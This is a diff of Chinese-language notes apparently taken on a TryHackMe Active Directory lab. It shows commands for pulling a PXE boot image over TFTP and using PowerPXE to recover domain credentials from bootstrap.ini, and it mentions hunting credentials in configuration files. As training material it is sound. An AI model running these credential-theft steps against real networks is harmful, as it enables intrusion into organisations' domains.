@@ -254,15 +254,42 @@ SCCM 几乎可以看作是 MDT 的扩展和老大哥。软件安装后会发生�
 现在，通过从 DHCP（已跳过）恢复此初始信息，我们可以枚举和检索 PXE 启动映像。
 连接到在域中的初始立足点：
 我们需要执行的第一步是使用 TFTP 并下载 BCD 文件以读取 MDT 服务器的配置。TFTP 比 FTP 更棘手，因为我们无法列出文件。相反，我们发送一个文件请求，服务器将通过 UDP 连接回我们以传输文件。因此，在指定文件和文件路径时，我们需要准确无误。BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：
-```cmd
+```powershell
 C:\Users\THM\Documents\Am0> tftp -i <MDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
 
 Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
 ```
 您必须使用 `nslookup mdt.{domain}` 查找MDT IP。随着BCD文件的恢复，我们将使用powerpxe来读取其内容。Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但结果通常会有所不同，因此最好执行手动方法。我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：
-```cmd
+```powershell
 C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. 
 PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1 
 PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd" 
 PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile >> Parse the BCD file: conf.bcd >>>> Identify wim file : <PXE Boot Image Location> <PXE Boot Image Location>
 ```
+WIM 文件是 Windows 映像格式 （WIM） 中的可启动映像。现在，我们已经有了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载此映像：
+```powershell
+PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim 
+Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
+```
+### 从 PXE 启动映像恢复凭据
+现在，我们已经恢复了 PXE 启动映像，我们可以泄露存储的凭据。应该注意的是，我们可以进行各种攻击。我们可以注入本地管理员用户，这样我们就可以在映像启动后立即获得管理员访问权限，我们可以安装映像以拥有已加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读[[借助 LAPS 和 PXE 接管 Windows 工作站 - RiskInsight.pdf]]。本练习将重点介绍仅尝试泄露凭据的简单攻击。
+同样，我们将使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找通常存储这些类型的凭据的 bootstrap.ini 文件来手动执行此步骤。要使用 powerpxe 从引导程序文件中恢复凭据，请运行以下命令：
+```powershell
+PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
+>> Open pxeboot.wim 
+>>>> Finding Bootstrap.ini 
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
+>>>> >>>> UserID = <account>
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = <password>
+```
+如您所见，powerpxe 能够恢复 AD 凭据。现在，我们有了另一组可以使用的 AD 凭据！
+## 配置文件
+我们将在此网络中探索的最后一个枚举途径是配置文件。假设您很幸运地造成了一个漏洞，使您可以访问组织网络上的主机。在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳途径。根据被破坏的主机，各种配置文件可能对枚举有价值：
+- 应用程序配置文件  
+- 服务配置文件
+- 注册表项
+- 集中部署的应用程序
+可以使用多个枚举脚本（例如 [Seatbelt](https://github.com/GhostPack/Seatbelt) ）来自动执行此过程。
+### 配置文件凭据
+但是，在此，我们将重点介绍如何从集中部署的应用程序恢复凭据。通常，这些应用程序需要一种方法在安装和执行阶段对域进行身份验证。例如，McAfee Enterprise Endpoint Security 是此类应用程序的一个示例，组织可以将其用作安全端点检测和响应工具。
